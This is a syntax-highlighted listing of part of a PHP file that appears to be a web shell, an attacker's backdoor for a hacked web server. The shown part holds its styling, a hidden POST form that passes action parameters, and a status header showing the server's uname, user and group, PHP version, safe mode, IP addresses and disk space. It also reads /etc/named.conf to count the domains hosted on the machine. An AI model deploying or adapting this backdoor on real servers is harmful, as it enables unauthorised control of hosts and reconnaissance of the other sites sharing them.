<span class="lineno"> 219</span> <span class="s1">  color: #FFF;</span>
<span class="lineno"> 220</span> <span class="s1">  background-color: #000;</span>
<span class="lineno"> 221</span> <span class="s1">  width: auto;</span>
<span class="lineno"> 222</span> <span class="s1">  border-right-width: 7px;</span>
<span class="lineno"> 223</span> <span class="s1">  border-left-width: 7px;</span>
<span class="lineno"> 224</span> <span class="s1">  border-top-style: solid;</span>
<span class="lineno"> 225</span> <span class="s1">  border-right-style: solid;</span>
<span class="lineno"> 226</span> <span class="s1">  border-bottom-style: solid;</span>
<span class="lineno"> 227</span> <span class="s1">  border-left-style: solid;</span>
<span class="lineno"> 228</span> <span class="s1">  border-top-color: #CCC;</span>
<span class="lineno"> 229</span> <span class="s1">  border-right-color: #CCC;</span>
<span class="lineno"> 230</span> <span class="s1">  border-bottom-color: #CCC;</span>
<span class="lineno"> 231</span> <span class="s1">  border-left-color: #CCC;</span>
<span class="lineno"> 232</span> <span class="s1">  height: auto;</span>
<span class="lineno"> 233</span> <span class="s1">  font-size: 12px;</span>
<span class="lineno"> 234</span> <span class="s1">  font-weight: bold;</span>
<span class="lineno"> 235</span> <span class="s1">  border-top-width: 0px;</span>
<span class="lineno"> 236</span> <span class="s1">}</span>
<span class="lineno"> 237</span> <span class="s1">  .whole #meunlist ul {</span>
<span class="lineno"> 238</span> <span class="s1">  padding-top: 5px;</span>
<span class="lineno"> 239</span> <span class="s1">  padding-right: 5px;</span>
<span class="lineno"> 240</span> <span class="s1">  padding-bottom: 7px;</span>
<span class="lineno"> 241</span> <span class="s1">  padding-left: 2px;</span>
<span class="lineno"> 242</span> <span class="s1">  text-align:center;</span>
<span class="lineno"> 243</span> <span class="s1">  list-style-type: none;</span>
<span class="lineno"> 244</span> <span class="s1">  margin: 0px;</span>
<span class="lineno"> 245</span> <span class="s1">}</span>
<span class="lineno"> 246</span> <span class="s1">  .whole #meunlist li {</span>
<span class="lineno"> 247</span> <span class="s1">  margin: 0px;</span>
<span class="lineno"> 248</span> <span class="s1">  padding: 0px;</span>
<span class="lineno"> 249</span> <span class="s1">  display: inline;</span>
<span class="lineno"> 250</span> <span class="s1">}</span>
<span class="lineno"> 251</span> <span class="s1">  .whole #meunlist a {</span>
<span class="lineno"> 252</span> <span class="s1">    font-family: arial, sans-serif;</span>
<span class="lineno"> 253</span> <span class="s1">  font-size: 14px;</span>
<span class="lineno"> 254</span> <span class="s1">  text-decoration:none;</span>
<span class="lineno"> 255</span> <span class="s1">  font-weight: bold;</span>
<span class="lineno"> 256</span> <span class="s1">  color: #fff;</span>
<span class="lineno"> 257</span> <span class="s1">  clear: both;</span>
<span class="lineno"> 258</span> <span class="s1">  width: 100px;</span>
<span class="lineno"> 259</span> <span class="s1">  margin-right: -6px;</span>
<span class="lineno"> 260</span> <span class="s1">  padding-top: 3px;</span>
<span class="lineno"> 261</span> <span class="s1">  padding-right: 15px;</span>
<span class="lineno"> 262</span> <span class="s1">  padding-bottom: 3px;</span>
<span class="lineno"> 263</span> <span class="s1">  padding-left: 15px;</span>
<span class="lineno"> 264</span> <span class="s1">  border-right-width: 1px;</span>
<span class="lineno"> 265</span> <span class="s1">  border-right-style: solid;</span>
<span class="lineno"> 266</span> <span class="s1">  border-right-color: #FFF;</span>
<span class="lineno"> 267</span> <span class="s1">}</span>
<span class="lineno"> 268</span> <span class="s1">  .whole #meunlist a:hover {</span>
<span class="lineno"> 269</span> <span class="s1">  color: #000;</span>
<span class="lineno"> 270</span> <span class="s1">  background: #fff;</span>
<span class="lineno"> 271</span> <span class="s1">}</span>
<span class="lineno"> 272</span> 
<span class="lineno"> 273</span> <span class="s1">.foot {</span>
<span class="lineno"> 274</span> <span class="s1">  font-family: Verdana, Geneva, sans-serif;</span>
<span class="lineno"> 275</span> <span class="s1">  background-color: #000;</span>
<span class="lineno"> 276</span> <span class="s1">  margin: 0px;</span>
<span class="lineno"> 277</span> <span class="s1">  padding: 0px;</span>
<span class="lineno"> 278</span> <span class="s1">  width: 100%;</span>
<span class="lineno"> 279</span> <span class="s1">  text-align: center;</span>
<span class="lineno"> 280</span> <span class="s1">  font-size: 12px;</span>
<span class="lineno"> 281</span> <span class="s1">  color: #CCC;</span>
<span class="lineno"> 282</span> <span class="s1">  border-right-width: 7px;</span>
<span class="lineno"> 283</span> <span class="s1">  border-left-width: 7px;</span>
<span class="lineno"> 284</span> <span class="s1">    border-bottom-width: 7px;</span>
<span class="lineno"> 285</span> <span class="s1">    border-bottom-style: solid;</span>
<span class="lineno"> 286</span> <span class="s1">    border-right-style: solid;</span>
<span class="lineno"> 287</span> <span class="s1">    border-right-style: solid;</span>
<span class="lineno"> 288</span> <span class="s1">  border-left-style: solid;</span>
<span class="lineno"> 289</span> <span class="s1">  border-top-color: #CCC;</span>
<span class="lineno"> 290</span> <span class="s1">  border-right-color: #CCC;</span>
<span class="lineno"> 291</span> <span class="s1">  border-bottom-color: #CCC;</span>
<span class="lineno"> 292</span> <span class="s1">  border-left-color: #CCC;</span>
<span class="lineno"> 293</span> <span class="s1">}&#39;</span><span class="p">;</span>
<span class="lineno"> 294</span> <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]))</span>
<span class="lineno"> 295</span>  <span class="p">{</span>
<span class="lineno"> 296</span>     <span class="k">echo</span> <span class="s2">&quot;.foottable {</span>
<span class="lineno"> 297</span> <span class="s2">    width: 300px;</span>
<span class="lineno"> 298</span> <span class="s2">    font-weight: bold;</span>
<span class="lineno"> 299</span> <span class="s2">    }&quot;</span><span class="p">;}</span>
<span class="lineno"> 300</span>     <span class="k">else</span>
<span class="lineno"> 301</span>     <span class="p">{</span>
<span class="lineno"> 302</span>        <span class="k">echo</span> <span class="s2">&quot;.foottable {</span>
<span class="lineno"> 303</span> <span class="s2">    width: 300px;</span>
<span class="lineno"> 304</span> <span class="s2">    font-weight: bold;</span>
<span class="lineno"> 305</span> <span class="s2">    background-color:red;</span>
<span class="lineno"> 306</span> <span class="s2">    }</span>
<span class="lineno"> 307</span> <span class="s2">    .dir {</span>
<span class="lineno"> 308</span> <span class="s2">      background-color:red;  </span>
<span class="lineno"> 309</span> <span class="s2">    }</span>
<span class="lineno"> 310</span> <span class="s2">    &quot;</span><span class="p">;</span> 
<span class="lineno"> 311</span>     <span class="p">}</span>    
<span class="lineno"> 312</span>  <span class="k">echo</span> <span class="s1">&#39;.main th{text-align:left;}</span>
<span class="lineno"> 313</span> <span class="s1"> .main a{color: #FFF;}</span>
<span class="lineno"> 314</span> <span class="s1"> .main tr:hover{background-color:red;}</span>
<span class="lineno"> 315</span> <span class="s1"> .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }</span>
<span class="lineno"> 316</span> <span class="s1"> .bigarea{ width:99%; height:300px; }   </span>
<span class="lineno"> 317</span> <span class="s1">  &amp;lt;/style&amp;gt;</span>
<span class="lineno"> 318</span> 
<span class="lineno"> 319</span> <span class="s1">&#39;</span><span class="p">;</span>
<span class="lineno"> 320</span> 
<span class="lineno"> 321</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;script&amp;gt;</span>
<span class="lineno"> 322</span> <span class="s2">    var c_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&#39;;</span>
<span class="lineno"> 323</span> <span class="s2">    var a_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;</span>
<span class="lineno"> 324</span> <span class="s2">    var charset_ = &#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="lineno"> 325</span> <span class="s2">    var p1_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="lineno"> 326</span> <span class="s2">    var p2_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">],</span><span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="lineno"> 327</span> <span class="s2">    var p3_ = &#39;&quot;</span> <span class="o">.</span> <span class="p">((</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">!==</span><span class="k">false</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;&#39;</span><span class="o">:</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p3&#39;</span><span class="p">],</span><span class="nx">ENT_QUOTES</span><span class="p">))</span> <span class="o">.</span><span class="s2">&quot;&#39;;</span>
<span class="lineno"> 328</span> <span class="s2">    var d = document;</span>
<span class="lineno"> 329</span> <span class="s2">  function set(a,c,p1,p2,p3,charset) {</span>
<span class="lineno"> 330</span> <span class="s2">      if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;</span>
<span class="lineno"> 331</span> <span class="s2">      if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;</span>
<span class="lineno"> 332</span> <span class="s2">      if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;</span>
<span class="lineno"> 333</span> <span class="s2">      if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;</span>
<span class="lineno"> 334</span> <span class="s2">      if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;</span>
<span class="lineno"> 335</span> <span class="s2">      if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;</span>
<span class="lineno"> 336</span> <span class="s2">  }</span>
<span class="lineno"> 337</span> <span class="s2">  function g(a,c,p1,p2,p3,charset) {</span>
<span class="lineno"> 338</span> <span class="s2">      set(a,c,p1,p2,p3,charset);</span>
<span class="lineno"> 339</span> <span class="s2">      d.mf.submit();</span>
<span class="lineno"> 340</span> <span class="s2">  }&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 341</span> 
<span class="lineno"> 342</span>     
<span class="lineno"> 343</span>    <span class="k">echo</span> <span class="s1">&#39;</span>
<span class="lineno"> 344</span> <span class="s1">&amp;lt;/head&amp;gt;</span>
<span class="lineno"> 345</span> 
<span class="lineno"> 346</span> <span class="s1">&amp;lt;body bgcolor=&quot;#000000&quot;  leftmargin=&quot;0&quot; topmargin=&quot;0&quot; marginwidth=&quot;0&quot; marginheight=&quot;0&quot;&amp;gt;</span>
<span class="lineno"> 347</span> <span class="s1">&amp;lt;div class=&quot;whole&quot;&amp;gt;</span>
<span class="lineno"> 348</span> <span class="s1">&amp;lt;form method=post name=mf style=&quot;display:none;&quot;&amp;gt;</span>
<span class="lineno"> 349</span> <span class="s1">&amp;lt;input type=hidden name=a&amp;gt;</span>
<span class="lineno"> 350</span> <span class="s1">&amp;lt;input type=hidden name=c&amp;gt;</span>
<span class="lineno"> 351</span> <span class="s1">&amp;lt;input type=hidden name=p1&amp;gt;</span>
<span class="lineno"> 352</span> <span class="s1">&amp;lt;input type=hidden name=p2&amp;gt;</span>
<span class="lineno"> 353</span> <span class="s1">&amp;lt;input type=hidden name=p3&amp;gt;</span>
<span class="lineno"> 354</span> <span class="s1">&amp;lt;input type=hidden name=charset&amp;gt;</span>
<span class="lineno"> 355</span> <span class="s1">&amp;lt;/form&amp;gt;</span>
<span class="lineno"> 356</span> <span class="s1">  &amp;lt;div class=&quot;header&quot;&amp;gt;&amp;lt;table width=&quot;100%&quot; border=&quot;0&quot;  align=&quot;lift&quot;&amp;gt;</span>
<span class="lineno"> 357</span> <span class="s1">  &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 358</span> <span class="s1">    &amp;lt;td width=&quot;3%&quot;&amp;gt;&amp;lt;span&amp;gt;Uname:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 359</span> <span class="s1">    &amp;lt;td colspan=&quot;2&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="o">@</span><span class="nb">php_uname</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">120</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 360</span> <span class="s1">    &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 361</span> <span class="s1">  &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 362</span> <span class="s1">    &amp;lt;td&amp;gt;&amp;lt;span&amp;gt;User:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 363</span> <span class="s1">    &amp;lt;td&amp;gt;&#39;</span><span class="o">.</span> <span class="nv">$uid</span> <span class="o">.</span> <span class="s1">&#39; [ &#39;</span> <span class="o">.</span> <span class="nv">$user</span> <span class="o">.</span> <span class="s1">&#39; ] &amp;lt;span&amp;gt;   Group: &amp;lt;/span&amp;gt;&#39;</span> <span class="o">.</span> <span class="nv">$gid</span> <span class="o">.</span> <span class="s1">&#39; [ &#39;</span> <span class="o">.</span> <span class="nv">$group</span> <span class="o">.</span> <span class="s1">&#39; ] &amp;lt;/td&amp;gt;</span>
<span class="lineno"> 364</span> <span class="s1">    &amp;lt;td width=&quot;14%&quot; rowspan=&quot;8&quot;&amp;gt;&amp;lt;img alt=&quot;&quot; src=&quot;data:image/jpeg;base64,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&quot; /&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 365</span> <span class="s1">  &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 366</span> <span class="s1">  &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 367</span> <span class="s1">    &amp;lt;td&amp;gt;&amp;lt;span&amp;gt;PHP:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 368</span> <span class="s1">    &amp;lt;td&amp;gt;&#39;</span><span class="o">.@</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span> <span class="s1">&#39;   &amp;lt;span&amp;gt;   Safe Mode:&#39;</span><span class="o">.</span><span class="nv">$safe_modes</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 369</span> <span class="s1">    &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 370</span> <span class="s1">  &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 371</span> <span class="s1">    &amp;lt;td&amp;gt;&amp;lt;span&amp;gt;Our IP:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 372</span> <span class="s1">    &amp;lt;td&amp;gt;&#39;</span><span class="o">.@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;SERVER_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;    &amp;lt;span&amp;gt;Server IP:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.@</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 373</span> <span class="s1">  &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 374</span> <span class="s1">  &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 375</span> <span class="s1">    &amp;lt;td&amp;gt;&amp;lt;span&amp;gt;WEBS:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 376</span> <span class="s1">    &amp;lt;td width=&quot;76%&quot;&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 377</span>     
<span class="lineno"> 378</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;unix&#39;</span><span class="p">)</span>
<span class="lineno"> 379</span>     <span class="p">{</span>
<span class="lineno"> 380</span>         <span class="nv">$d0mains</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s2">&quot;/etc/named.conf&quot;</span><span class="p">);</span>
<span class="lineno"> 381</span>         <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$d0mains</span><span class="p">)</span>
<span class="lineno"> 382</span>         <span class="p">{</span>
<span class="lineno"> 383</span>             <span class="k">echo</span> <span class="s2">&quot;CANT READ named.conf&quot;</span><span class="p">;</span>
<span class="lineno"> 384</span>         <span class="p">}</span>
<span class="lineno"> 385</span>         <span class="k">else</span>
<span class="lineno"> 386</span>         <span class="p">{</span>
<span class="lineno"> 387</span>           <span class="nv">$count</span><span class="p">;</span>  
<span class="lineno"> 388</span>          <span class="k">foreach</span><span class="p">(</span><span class="nv">$d0mains</span> <span class="k">as</span> <span class="nv">$d0main</span><span class="p">)</span>
<span class="lineno"> 389</span>          <span class="p">{</span>
<span class="lineno"> 390</span>           <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;zone&quot;</span><span class="p">,</span><span class="nv">$d0main</span><span class="p">))</span>
<span class="lineno"> 391</span>           <span class="p">{</span>
<span class="lineno"> 392</span>           <span class="nb">preg_match_all</span><span class="p">(</span><span class="s1">&#39;#zone &quot;(.*)&quot;#&#39;</span><span class="p">,</span> <span class="nv">$d0main</span><span class="p">,</span> <span class="nv">$domains</span><span class="p">);</span>
<span class="lineno"> 393</span>            <span class="nb">flush</span><span class="p">();</span>
<span class="lineno"> 394</span>           <span class="k">if</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$domains</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="mi">2</span><span class="p">){</span>
<span class="lineno"> 395</span>          <span class="nb">flush</span><span class="p">();</span>
<span class="lineno"> 396</span>          <span class="nv">$count</span><span class="o">++</span><span class="p">;</span>
<span class="lineno"> 397</span>            <span class="p">}</span> 
<span class="lineno"> 398</span>            <span class="p">}</span>
<span class="lineno"> 399</span>            <span class="p">}</span>
<span class="lineno"> 400</span>            <span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$count</span><span class="s2">  Domains&quot;</span><span class="p">;</span>
<span class="lineno"> 401</span>         <span class="p">}</span>
<span class="lineno"> 402</span>     <span class="p">}</span>
<span class="lineno"> 403</span>     <span class="k">else</span><span class="p">{</span> <span class="k">echo</span><span class="s2">&quot;CANT READ |Windows|&quot;</span><span class="p">;}</span>
<span class="lineno"> 404</span>     
<span class="lineno"> 405</span>       <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 406</span> <span class="s1">    &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 407</span> <span class="s1">    &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 408</span> <span class="s1">    &amp;lt;td height=&quot;16&quot;&amp;gt;&amp;lt;span&amp;gt;HDD:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 409</span> <span class="s1">    &amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nx">madSize</span><span class="p">(</span><span class="nv">$totalSpace</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Free:&amp;lt;/span&amp;gt;&#39;</span> <span class="o">.</span> <span class="nx">madSize</span><span class="p">(</span><span class="nv">$freeSpace</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; [&#39;</span><span class="o">.</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span> <span class="p">(</span><span class="nv">$freeSpace</span><span class="o">/</span><span class="nv">$totalSpace</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;%]&amp;lt;/td&amp;gt;</span>
